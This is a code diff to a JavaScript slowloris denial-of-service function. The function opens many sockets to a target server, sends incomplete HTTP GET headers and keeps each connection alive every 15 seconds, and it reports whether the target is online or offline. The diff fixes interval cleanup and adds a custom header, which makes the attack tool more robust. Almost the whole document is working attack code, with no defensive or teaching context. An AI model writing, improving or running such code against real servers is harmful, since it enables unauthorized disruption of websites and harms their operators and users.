@@ -44,7 +44,7 @@ function slowloris(target, numSockets, statsCallback) {
             }
         }
 
-        setInterval(updateStats, 1000);
+        const statsInterval = setInterval(updateStats, 1000);
 
         function createSocket(hostname, port, index, isSecure, path) {
             let socket;
@@ -61,9 +61,11 @@ function slowloris(target, numSockets, statsCallback) {
                     console.log(`Socket ${index + 1} opened.`);
                     targetStatus = "Online";
                     sendInitialHeader(socket, hostname, path);
-                    setInterval(() => {
+                    const keepAliveInterval = setInterval(() => {
                         sendKeepAliveHeader(socket);
                     }, 15000);
+
+                    socket.keepAliveInterval = keepAliveInterval;
                 });
 
                 socket.on('close', () => {
@@ -72,6 +74,7 @@ function slowloris(target, numSockets, statsCallback) {
                     if (sockets.length === 0) {
                         targetStatus = "Offline";
                     }
+                    clearInterval(socket.keepAliveInterval);
                 });
 
                 socket.on('error', (error) => {
@@ -90,7 +93,7 @@ function slowloris(target, numSockets, statsCallback) {
         }
 
         function sendInitialHeader(socket, hostname, path) {
-            const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nConnection: keep-alive\r\n\r\n`;
+            const initialHeader = `GET ${path} HTTP/1.1\r\nHost: ${hostname}\r\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36\r\nConnection: keep-alive\r\nX-Custom-Header: initial\r\n\r\n`;
             try {
                 socket.send(initialHeader);
                 packetsSent++;
@@ -116,6 +119,7 @@ function slowloris(target, numSockets, statsCallback) {
         function closeSocket(socket, index) {
             try {
                 if (socket && (socket.readyState === WebSocket.OPEN || socket.readyState === WebSocket.CONNECTING)) {
+                    clearInterval(socket.keepAliveInterval);
                     socket.close();
                 }
                 sockets = sockets.filter(s => s !== socket);
@@ -134,6 +138,7 @@ function slowloris(target, numSockets, statsCallback) {
                 closeSocket(socket);
             });
             sockets = [];
+            clearInterval(statsInterval);
             console.log("Slowloris attack stopped.");
         }
     };
